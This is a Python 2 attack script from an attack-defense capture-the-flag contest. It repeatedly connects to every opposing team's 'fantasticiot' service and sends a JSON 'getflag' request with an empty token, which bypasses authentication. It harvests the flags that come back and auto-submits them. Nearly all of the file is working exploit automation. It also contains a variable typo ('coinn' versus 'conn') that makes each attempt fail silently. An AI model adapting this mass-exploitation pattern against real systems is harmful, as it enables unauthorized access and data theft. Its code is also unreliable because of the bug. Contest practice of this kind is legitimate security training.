#!/usr/bin/env python2

# This code was written 10 hours before the competition, yikes
# Any bugs are your problem

import socks # pip install PySocks
import socket
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4444)
socket.socket = socks.socksocket

from pwn import * # pip install pwntools
from swpag_client import Team # pip install swpag_client
import time
import traceback
import json
import sys

team = Team(None, "xxxxxxxxxxxxxxxxxxx")

def team_ip(team_host):
    # 172.31.129.1 (team1) ... 172.31.129.254 (team254) ... 172.31.130.1 (team255) ...
    team_number = int(team_host[4:])
    minor = ((team_number - 1) % 254) + 1
    major = (team_number / 255) + 129
    return '172.31.{major}.{minor}'.format(major=major, minor=minor)

services = team.get_service_list()

service_flag_ids = dict()

while True:
    for service in services:
        if service['service_name'] != 'fantasticiot':
            continue

        print("Going to attack", service['service_name'])
        if service['service_name'] not in service_flag_ids:
            service_flag_ids[service['service_name']] = set()

        targets = team.get_targets(service['service_id'])
        flag_list = []
        for target in targets:
            flag_id = target['flag_id']
            ip = team_ip(target['hostname'])

            port = target['port']
            if flag_id not in service_flag_ids[service['service_name']]:
                try:
                    coinn = remote(ip, port, timeout=1)
                    
                    # exploitation happens here
                    conn.sendline('{"service": "flag", "op": "getflag", "id": "%s", "token": ""}' % flag_id)
                    flag = json.loads(conn.recv().strip())['flag']

                    conn.close()
                    flag_list.append(flag)
                    print("HACKED")
                except Exception as e:
                    print("Error connecting to", target['team_name'], target['hostname'], ip, port)
                    print(e)

                service_flag_ids[service['service_name']].add(flag_id)

        result = team.submit_flag(flag_list)
        print result
    time.sleep(10) # DOS is against the rules

